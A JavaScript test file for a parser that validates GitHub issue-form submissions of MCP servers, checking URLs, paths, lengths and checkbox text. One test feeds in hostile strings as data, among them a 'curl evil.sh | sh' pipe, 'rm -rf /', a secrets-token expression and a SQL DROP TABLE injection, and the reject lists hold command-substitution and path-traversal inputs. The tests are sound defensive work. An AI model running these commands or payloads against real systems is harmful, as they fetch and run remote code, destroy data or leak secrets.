import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parseFormBody, validateSubmission, parseRepoUrl, parsePath, MAX_BODY } from '../scripts/lib/form.mjs';
import { formBody } from './helpers.mjs';

const run = (opts) => {
  const p = parseFormBody(typeof opts === 'string' ? opts : formBody(opts));
  return p.errors.length ? { submission: null, errors: p.errors } : validateSubmission(p.fields);
};

test('a well-formed submission parses', () => {
  const r = run({});
  assert.deepEqual(r.errors, []);
  assert.deepEqual(r.submission, { owner: 'acme', repo: 'weather-mcp', path: '', name: 'Weather MCP', description: 'Forecasts and alerts for agents.' });
});

test('CRLF bodies and a subfolder path parse', () => {
  const r = run(formBody({ path: './packages/server/' }).replace(/\n/g, '\r\n'));
  assert.deepEqual(r.errors, []);
  assert.equal(r.submission.path, 'packages/server');
});

test('the permission box must be ticked', () => {
  const r = run({ ticked: false });
  assert.equal(r.submission, null);
  assert.match(r.errors.join(' '), /not ticked/);
});

test('a lowercase x ticks the box too', () => {
  assert.deepEqual(run(formBody().replace('- [X]', '- [x]')).errors, []);
});

test('the box text must be the form text, not any ticked line', () => {
  const body = formBody({ ticked: false }) + '\n- [x] something else\n';
  assert.equal(run(body).submission, null);
});

test('repeated or unknown sections are rejected', () => {
  const dup = formBody() + '\n### Display name\n\nSecond name\n';
  assert.match(run(dup).errors.join(' '), /twice/);
  const extra = formBody() + '\n### Extra notes\n\nhello\n';
  assert.match(run(extra).errors.join(' '), /does not expect/);
});

test('empty, oversized and non-string bodies are rejected', () => {
  assert.ok(parseFormBody('').errors.length);
  assert.ok(parseFormBody(null).errors.length);
  assert.ok(parseFormBody('x'.repeat(MAX_BODY + 1)).errors.length);
});

test('hostile text in name and description stays data and is bounded', () => {
  const name = '$(curl evil.sh | sh) `rm -rf /` ${{ secrets.GITHUB_TOKEN }}';
  const r = run({ name, description: '"; DROP TABLE servers; -- \u202eevil\u0007' });
  assert.deepEqual(r.errors, []);
  assert.equal(r.submission.name, name);
  assert.ok(!/[\u202e\u0007]/.test(r.submission.description));
  assert.match(run({ name: 'n'.repeat(81) }).errors.join(' '), /longer than 80/);
  assert.match(run({ description: 'd'.repeat(201) }).errors.join(' '), /longer than 200/);
  assert.match(run({ name: '_No response_' }).errors.join(' '), /display name is empty/);
});

test('repository URLs: only https://github.com/owner/repo', () => {
  const ok = ['https://github.com/acme/weather-mcp', 'https://github.com/acme/weather-mcp/', 'https://github.com/acme/weather-mcp.git', 'https://github.com/Acme-Co/x.y_z'];
  for (const u of ok) assert.ok(!parseRepoUrl(u).error, u);
  assert.deepEqual(parseRepoUrl('https://github.com/acme/weather-mcp.git'), { owner: 'acme', repo: 'weather-mcp' });
  const bad = [
    'http://github.com/acme/x', 'https://www.github.com/acme/x', 'https://github.com.evil.com/acme/x', 'https://evil.com/github.com/acme/x',
    'https://github.com/acme', 'https://github.com/acme/x/tree/main/sub', 'https://github.com/acme/x?tab=readme', 'https://github.com/acme/x#readme',
    'https://github.com/acme/..', 'https://github.com/../x', 'https://github.com/-acme/x', 'https://github.com/ac--me/x', 'https://github.com/acme/x y',
    'javascript:alert(1)', 'github.com/acme/x', 'https://github.com/acme/x\nhttps://github.com/b/c', 'https://user:pass@github.com/acme/x', '',
    'https://github.com/' + 'a'.repeat(40) + '/x', 'https://github.com/acme/$(id)',
  ];
  for (const u of bad) assert.ok(parseRepoUrl(u).error, 'should reject ' + JSON.stringify(u));
});

test('paths: plain folder names only', () => {
  assert.deepEqual(parsePath(''), { path: '' });
  assert.deepEqual(parsePath('/'), { path: '' });
  assert.deepEqual(parsePath('packages/@scope/server'), { path: 'packages/@scope/server' });
  for (const p of ['../x', 'a/../b', 'a//b', 'a/./b', 'a b', 'a\\b', '$(id)', 'a;b', 'x'.repeat(201)]) assert.ok(parsePath(p).error, p);
});

test('a URL that smuggles a second line is rejected as a whole', () => {
  const body = formBody({ repository: 'https://github.com/acme/x\n### Display name\n\nX' });
  assert.equal(run(body).submission, null);
});

test('the parser headings match the issue form labels', async () => {
  const { readFileSync } = await import('node:fs');
  const { FIELDS, PERMISSION_TEXT } = await import('../scripts/lib/form.mjs');
  const y = readFileSync(new URL('../.github/ISSUE_TEMPLATE/submit-server.yml', import.meta.url), 'utf8');
  for (const h of Object.values(FIELDS)) assert.ok(y.includes('      label: ' + h + '\n'), h);
  assert.ok(y.includes('        - label: ' + PERMISSION_TEXT + '\n'));
  assert.ok(y.includes('labels: ["submission"]'));
});
